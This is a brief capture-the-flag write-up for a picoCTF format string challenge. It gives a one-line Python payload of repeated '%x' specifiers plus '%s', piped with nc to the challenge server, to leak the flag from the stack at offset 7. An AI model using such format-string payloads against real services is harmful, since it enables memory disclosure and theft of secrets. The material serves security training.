This program is vulnerable to a format string attack, which we can easily exploit by
brute forcing the offset required to access the flag, then print the entire thing as a string.
Turns out this offset is 7.

$ python -c "print '%x'*7+'%s'" | nc 2018shell3.picoctf.com 57169
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
